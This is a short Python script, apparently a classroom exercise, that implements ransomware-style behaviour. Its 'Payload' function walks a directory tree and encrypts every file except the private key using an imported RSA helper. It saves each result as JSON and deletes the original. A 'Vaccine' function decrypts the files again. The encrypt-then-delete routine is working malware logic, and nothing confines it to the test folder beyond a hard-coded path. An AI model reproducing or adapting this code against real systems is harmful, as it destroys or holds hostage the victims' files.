#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Sun Nov 25 18:18:28 2018

@author: QuangLe
"""

from os import walk
import base64
import json
import os
import rsaEncrypt as rsaE

cwd='/Users/QuangLe/Desktop/testpython'
#Payload
def Payload():
    for root,dirs,files in walk(cwd):
        for name in files: #get all names of file in the directory
            path=os.path.join(root,name) #make the path to the file
            if (name != "PrivateKeyTB378.pem"): 
               RSACipher,C, IV, tag, ext = rsaE.MyRSAEncrypt(path,rsaE.pubKey) #encrypt the file
               jName=path.replace(ext,'') #get the name of the file
               file= {'RSACipher':base64.encodestring(RSACipher).decode('ascii'),\
                      'C':base64.encodestring(C).decode('ascii'),\
                      'IV':base64.encodestring(IV).decode('ascii'),\
                      'tag':base64.encodestring(tag).decode('ascii'),\
                      'ext':ext } #make dict for json
               with open(jName + ".json", "w") as outfile: 
                   outfile.write(json.dumps(file)) #write json file
               os.remove(path) #remove the original file

#Vaccine
def Vaccine():
    for root,dirs,files in walk(cwd):
        for name in files: #get all names of file in the directory
            path=os.path.join(root,name) #make the path to the file
            if (path.endswith(".json") and not name.startswith('.')): #ignore hidden files
                with open(path) as file:
                    dFile=json.loads(file.read()) #get info from json file
                print(dFile['IV'])
                
                RSACipher = base64.decodestring(dFile['RSACipher'].encode('ascii'))
                C = base64.decodestring(dFile['C'].encode('ascii'))
                IV = base64.decodestring(dFile['IV'].encode('ascii'))
                tag = base64.decodestring(dFile['tag'].encode('ascii'))
                ext = dFile['ext']
                jName=path.replace('.json','') #extract name for the file
                rsaE.MyRSADecrypt(RSACipher,C,IV,tag,ext,rsaE.priKey,jName) #decrypt the file
                #os.remove(name)
